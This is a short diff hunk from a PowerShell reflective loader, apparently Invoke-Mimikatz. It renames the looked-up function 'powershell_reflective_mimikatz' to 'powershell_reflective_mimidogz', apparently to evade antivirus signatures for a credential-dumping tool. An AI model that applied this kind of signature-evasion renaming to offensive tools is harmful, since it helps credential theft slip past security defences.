@@ -2415,7 +2415,7 @@ $RemoteScriptBlock = {
 		{
 
                     Write-Verbose "Calling function with WString return type"
-				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimidogz"
 				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
 				    {
 					    Throw "Couldn't find function address."
